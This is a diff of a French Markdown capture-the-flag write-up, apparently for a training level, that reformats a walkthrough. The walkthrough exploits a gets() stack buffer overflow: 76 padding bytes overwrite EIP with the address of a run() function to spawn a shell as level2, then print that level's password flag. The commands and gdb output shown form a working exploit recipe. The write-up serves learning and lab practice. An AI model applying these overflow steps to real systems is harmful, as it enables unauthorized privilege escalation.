@@ -96,9 +96,9 @@
 
 ## Exploit
 
-- L'objectif va être de forcer l'appel de la fonction run() par la fonction main() pour avoir notre shell en tant que level2.
-- On va tirer avantage de la [vulnérabilité de gets à un buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) pour écrire l'adresse de run dans l'EIP, puisqu'il n'est pas protégé.
-- Comme vu plus haut, main alloue 80 octets dans la stack pour ses variables, on va commencer par là:
+L'objectif va être de forcer l'appel de la fonction run() par la fonction main() pour avoir notre shell en tant que level2.
+On va tirer avantage de la [vulnérabilité de gets à un buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) pour écrire l'adresse de run dans l'EIP, puisqu'il n'est pas protégé.
+<br/><br/>Comme vu plus haut, main alloue 80 octets dans la stack pour ses variables, on va commencer par là:
   - `python -c 'print "a" * 80' > /tmp/exploit`
   - `gdb level1`
     - `run < /tmp/exploit`
@@ -110,23 +110,23 @@
       ```
       - Nice, on SegFault comme attendu et l'eip est réécrit avec des a: `0x61616161`
 
-- On devrait pouvoir écraser la valeur de l'eip avec les 4 derniers octets, on vérifie avec un exploit de 76 "a" et 4 "b" :
-  - `python -c 'print "a" * 76 + "b" * 4' > /tmp/exploit`
-    ```
-    Starting program: /home/user/level1/level1 < /tmp/exploit
+On devrait pouvoir écraser la valeur de l'eip avec les 4 derniers octets, on vérifie avec un exploit de 76 "a" et 4 "b" :
+- `python -c 'print "a" * 76 + "b" * 4' > /tmp/exploit`
+  ```
+  Starting program: /home/user/level1/level1 < /tmp/exploit
 
-    Program received signal SIGSEGV, Segmentation fault.
-    0x62626262 in ?? ()
-    ```
-    - Parfait, l'EIP est écrasé par les 4 derniers octets: `0x62626262`
-- On a vu lors de l'analyse que l'adresse de la fonction run() est 0x08048444, on la passe en [little endian](https://security.stackexchange.com/questions/177819/why-do-we-use-little-endian-in-buffer-overflow-attacks) avant de la load à la fin de notre exploit:
-  - `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit`
-  - `cat /tmp/exploit | ./level1`
-    ```
-    Good... Wait what?
-    Segmentation fault (core dumped)
-    ```
-    - Ok, on lance bien la fonction run(), mais le shell est fermé tout de suite, il faut [garder stdin ouvert avec cat](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process):
+  Program received signal SIGSEGV, Segmentation fault.
+  0x62626262 in ?? ()
+  ```
+  - Parfait, l'EIP est écrasé par les 4 derniers octets: `0x62626262`
+On a vu lors de l'analyse que l'adresse de la fonction run() est 0x08048444, on la passe en [little endian](https://security.stackexchange.com/questions/177819/why-do-we-use-little-endian-in-buffer-overflow-attacks) avant de la load à la fin de notre exploit:
+- `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit`
+- `cat /tmp/exploit | ./level1`
+  ```
+  Good... Wait what?
+  Segmentation fault (core dumped)
+  ```
+  - Ok, on lance bien la fonction run(), mais le shell est fermé tout de suite, il faut [garder stdin ouvert avec cat](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process):
       > " The shell doesn't have any input, when it detects EOF it dies. " 
       - `cat /tmp/exploit - | ./level1`
         ```
@@ -137,7 +137,7 @@
           ```
           level2
           ```
-          - `cat /home/user/level2/.pass`
-            ```
-            53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-            ```
+        - `cat /home/user/level2/.pass`
+          ```
+          53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+          ```
